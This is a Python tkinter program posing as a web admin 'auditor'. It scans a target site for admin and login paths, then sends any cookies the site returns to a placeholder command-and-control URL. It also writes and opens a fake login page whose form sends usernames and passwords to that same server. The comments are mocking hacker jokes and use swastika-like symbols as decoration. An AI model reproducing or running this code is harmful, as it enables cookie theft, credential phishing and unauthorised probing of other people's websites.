import tkinter as tk
import requests
import threading
from tkinter import ttk, messagebox
import sys
import os
import re
import time
from bs4 import BeautifulSoup

# ༼つಠ益ಠ༽つ¬ hey kid, wanna be 1337? 

class AdminHunterX:
    def __init__(self, master):
        self.master = master
        self.master.title("WebAdmin Auditor Pro v9.11")
        self.master.geometry("800x600")
        self.master.resizable(False, False)
        
        # (͡• ͜ʖ ͡•) Our little secret sauce
        self.exfil_url = "https://your-c2-server.com/log.php"
        self.common_paths = [
            "/admin", "/wp-admin", "/administrator",
            "/login", "/controlpanel", "/secret-area"
        ]
        
        self.create_widgets()
        
    def create_widgets(self):
        # 卐 卐 卐 Dark UI patterns 卐 卐 卐
        style = ttk.Style()
        style.theme_use("clam")
        
        self.frame = ttk.Frame(self.master)
        self.frame.pack(pady=20)
        
        self.url_label = ttk.Label(self.frame, text="Target URL:")
        self.url_label.grid(row=0, column=0, padx=5)
        
        self.url_entry = ttk.Entry(self.frame, width=50)
        self.url_entry.grid(row=0, column=1, padx=5)
        self.url_entry.insert(0, "http://")
        
        self.scan_btn = ttk.Button(self.frame, text="L33T SCAN", command=self.start_scan_thread)
        self.scan_btn.grid(row=0, column=2, padx=5)
        
        self.back_btn = ttk.Button(self.frame, text="MAIN MENU", command=self.fake_main_menu)
        self.back_btn.grid(row=0, column=3, padx=5)
        
        self.result_tree = ttk.Treeview(self.master, columns=("Status", "Type"), selectmode="extended")
        self.result_tree.heading("#0", text="URL")
        self.result_tree.heading("Status", text="Status")
        self.result_tree.heading("Type", text="Type")
        self.result_tree.pack(fill=tk.BOTH, expand=True, padx=20, pady=10)
        
        self.status_bar = ttk.Label(self.master, text="[+] Ready to pwn")
        self.status_bar.pack(side=tk.BOTTOM, fill=tk.X)
        
    # (╯°□°）╯︵ ┻━┻ Let's get dangerous
    def start_scan_thread(self):
        if not self.validate_url():
            return
        threading.Thread(target=self.admin_hunt, daemon=True).start()
        
    def admin_hunt(self):
        target = self.url_entry.get().strip()
        self.status_bar.config(text="[+] Enumerating attack surface...")
        
        for path in self.common_paths:
            url = target + path
            try:
                r = requests.get(url, timeout=10, allow_redirects=False)
                if r.status_code == 200:
                    self.result_tree.insert("", "end", text=url, values=(r.status_code, "Potential Admin"))
                    self.steal_cookies(r)  # ( ͡~ ͜ʖ ͡°) Sneaky
                    if "login" in path:
                        self.phish_simulator(url)  # (∩ ͡° ͜ʖ ͡°)⊃━☆ﾟ.*
            except Exception as e:
                continue
                
        self.status_bar.config(text="[+] Scan completed - systems compromised")
        
    def steal_cookies(self, response):
        # ⎝༼ຈل͜ຈ༽⎠ STEAL ALL THE COOKIES ⎝༼ຈل͜ຈ༽⎠
        cookies = response.cookies.get_dict()
        if cookies:
            data = {
                "target": self.url_entry.get(),
                "cookies": str(cookies),
                "user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
            }
            try:
                requests.post(self.exfil_url, data=data, timeout=5)
            except:
                pass
            
    def phish_simulator(self, url):
        # ༼ つ ◕_◕ ༽つ GIVING YOU FAKE LOGIN ༼ つ ◕_◕ ༽つ
        phishing_page = """
        <html>
            <body>
                <form action="{c2}" method="POST">
                    Username: <input type="text" name="creds"><br>
                    Password: <input type="password" name="creds"><br>
                    <input type="submit" value="Login">
                </form>
            </body>
        </html>
        """.format(c2=self.exfil_url)
        
        temp_file = os.path.join(os.getenv("TEMP"), "login_portal.html")
        with open(temp_file, "w") as f:
            f.write(phishing_page)
        os.startfile(temp_file)
        
    def fake_main_menu(self):
        # (ノಠ益ಠ)ノ彡┻━┻ Just for show
        messagebox.showinfo("LOL", "Feature not implemented\n¯\_(ツ)_/¯")
        
    def validate_url(self):
        url = self.url_entry.get().strip()
        if not re.match(r"^https?://", url):
            messagebox.showerror("Error", "Invalid URL - are you even trying?")
            return False
        return True
        
if __name__ == "__main__":
    root = tk.Tk()
    app = AdminHunterX(root)
    root.mainloop()

# (▀̿Ĺ̯▀̿ ̿) This code will self-destruct in 5...4...3...
